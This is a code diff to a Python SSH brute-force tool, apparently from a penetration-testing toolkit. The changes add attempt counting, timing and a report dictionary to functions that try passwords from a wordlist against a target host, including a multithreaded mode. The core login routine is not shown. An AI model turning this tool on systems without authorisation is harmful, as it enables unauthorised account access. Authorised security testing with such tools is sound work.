@@ -32,16 +32,18 @@ def BruteForceSlow(ip, username, passwords):
     updater = ProgressUpdater(len(passwords))
     updater.start()
 
+    attempts = 0
     for password in passwords:
         success = TrySsh(ip, username, password)
         updater.increment()
+        attempts += 1
 
         if success:
             updater.stop()
-            return f"{username}:{password}"
+            return f"{username}:{password}", attempts
 
     updater.stop()
-    return None
+    return None, attempts
 
 def BruteForceCustom(ip, username, passwords, threadCount=10, delay=0.1):
     passwordQueue = Queue()
@@ -55,8 +57,11 @@ def BruteForceCustom(ip, username, passwords, threadCount=10, delay=0.1):
     updater = ProgressUpdater(len(passwords))
     updater.start()
 
+    attempts = 0
+    attemptsLock = Lock()  # To safely increment attempts across threads
+
     def worker():
-        nonlocal found
+        nonlocal found, attempts
 
         while not stopEvent.is_set():
             try:
@@ -70,6 +75,9 @@ def BruteForceCustom(ip, username, passwords, threadCount=10, delay=0.1):
 
             success = TrySsh(ip, username, password)
             updater.increment()
+            
+            with attemptsLock:
+                attempts += 1
 
             if success:
                 with lock:
@@ -93,36 +101,53 @@ def BruteForceCustom(ip, username, passwords, threadCount=10, delay=0.1):
         t.join()
 
     updater.stop()
-    return found["credential"]
+    return found["credential"], attempts
 
-def BruteForceSsh(ip, username, passwordFile, mode="slow", reportFormat="pdf", baseDir=None, delay=0.1):
+def BruteForceSsh(ip, username, passwordFile, mode="slow", baseDir=None, delay=0.1):
     print(f"\n{conf.BOLD}Starting SSH Brute Force on {ip} with username '{username}' in {mode.upper()} mode.\n{conf.RESET}")
 
-    tool_dir    = os.path.dirname(__file__)
-    modules_dir = os.path.dirname(tool_dir)
+    toolDir    = os.path.dirname(__file__)
+    modulesDir = os.path.dirname(toolDir)
 
     if os.path.isabs(passwordFile):
-        password_path = passwordFile
+        passwordPath = passwordFile
     else:
-        password_path = os.path.join(modules_dir, passwordFile)
+        passwordPath = os.path.join(modulesDir, passwordFile)
 
-    if not os.path.isfile(password_path):
-        print(f"[!] Password file not found: {password_path}")
-        return
+    if not os.path.isfile(passwordPath):
+        print(f"[!] Password file not found: {passwordPath}")
+        return None
 
     try:
-        with open(password_path, "r", encoding="utf-8") as f:
+        with open(passwordPath, "r", encoding="utf-8") as f:
             passwords = [line.strip() for line in f if line.strip()]
     except Exception as e:
         print(f"[!] Error reading password file: {e}")
-        return
+        return None
+
+    totalPasswords = len(passwords)
+    startTime = time.time()
 
     if mode == "fast":
-        result = BruteForceCustom(ip, username, passwords, delay=delay)
+        result, totalAttempts = BruteForceCustom(ip, username, passwords, delay=delay)
     else:
-        result = BruteForceSlow(ip, username, passwords)
+        result, totalAttempts = BruteForceSlow(ip, username, passwords)
+
+    endTime = time.time()
+    duration = round(endTime - startTime, 2)
 
     if result:
         print(f"{conf.RED}\n\n[+] Credential found: {conf.RESET}{conf.BOLD}{result}{conf.RESET}")
     else:
         print(f"\n{conf.RED}[-] No valid credentials found.{conf.RESET}")
+
+    # Return all the info needed for the report
+    return {
+        "ip": ip,
+        "username": username,
+        "passwordFile": os.path.basename(passwordFile),
+        "totalPasswords": totalPasswords,
+        "totalAttempts": totalAttempts,
+        "duration": duration,
+        "result": result if result else "not found"
+    }
